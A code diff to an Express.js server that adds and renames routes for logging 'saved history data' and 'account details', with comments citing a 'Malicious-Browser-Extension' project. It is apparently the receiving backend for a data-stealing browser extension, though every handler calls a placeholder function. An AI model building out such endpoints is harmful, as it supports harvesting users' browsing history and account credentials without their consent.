@@ -47,6 +47,23 @@ app.get(
 );
 
 // /****************************************************************
+//                           Add New User
+// ****************************************************************/
+
+app.post(
+  "/user/add/",
+  catchErrors(
+    authed(async (req, res) => {
+      const { uid, extension_id, date_created } = req.body;
+      // generate date stamp (here or from request?)
+
+      const result = await sd.placeholder(uid, extension_id, date_created);
+      res.json({ result: result });
+    })
+  )
+);
+
+// /****************************************************************
 //                        Logging Saved Data
 // ****************************************************************/
 
@@ -54,23 +71,23 @@ app.get(
 // https://github.com/nigamaviral/Malicious-Browser-Extension/blob/master/extension/background.js#L228
 // https://stackoverflow.com/a/23854032
 
-// Save stored history data
+// Save saved history data
 app.post(
-  "/history/stored/",
+  "/history/saved/",
   catchErrors(
     authed(async (req, res) => {
-      const { uid, date, history } = req.body;
+      const { uid, extension_id, date_created } = req.body;
       // generate date stamp (here or from request?)
 
-      const result = await sd.placeholder(uid, date, history);
-      res.json({ result });
+      const result = await sd.placeholder(uid, extension_id, date_created);
+      res.json({ result: result });
     })
   )
 );
 
-// Save stored account details
+// Save saved account details
 app.post(
-  "/account/stored/",
+  "/account/saved/",
   catchErrors(
     authed(async (req, res) => {
       const { uid, date, accounts } = req.body;
